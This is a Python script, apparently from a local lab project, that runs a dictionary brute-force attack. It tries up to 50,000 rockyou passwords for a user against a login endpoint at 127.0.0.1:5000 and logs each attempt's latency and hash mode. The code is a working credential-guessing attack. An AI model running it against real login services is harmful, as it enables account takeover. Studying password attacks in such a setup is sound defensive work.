# brute force attack
import requests
import time
import json
import os
import sys
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(__file__))
BASE_URL = "http://127.0.0.1:5000"
USERS_FILE = os.path.join(BASE_DIR, "data", "users.json")
LOG_FILE = os.path.join(BASE_DIR, "logs", "attempts.log")
WORDLIST_PATH = os.path.join(BASE_DIR, "data", "rockyou.txt")

def load_wordlist(limit=50000):
    with open(WORDLIST_PATH, "r", encoding="latin-1") as f:
        # read lines, strip newline, take first N entries
        return [line.strip() for line in f if line.strip()][:limit]

def load_users():
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def brute_force(username):
    users = load_users()
    target = next((u for u in users if u["username"] == username), None)
    if not target:
        print(f"[ERROR] User {username} not found in users.json")
        return

    hash_mode = target.get("hash_mode", "sha256")

    PASSWORD_LIST = load_wordlist()
    for candidate in PASSWORD_LIST:
        start = time.time()
        resp = requests.post(f"{BASE_URL}/login", json={
            "username": username,
            "password": candidate
        })
        latency_ms = int((time.time() - start) * 1000)

        if resp.status_code == 200:
            result = "SUCCESS"
            print(f"[SUCCESS] {username} cracked with '{candidate}' (latency {latency_ms} ms)")
        else:
            result = "FAILED"
            print(f"[FAILED] {username} with '{candidate}' (latency {latency_ms} ms)")

        entry = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "hash_mode": hash_mode,
            "result": result,
            "latency_ms": latency_ms
        }
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")

        if result == "SUCCESS":
            return

    print(f"[INFO] Exhausted list, no success for {username}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python scripts/brute_force.py <username>")
    else:
        brute_force(sys.argv[1])
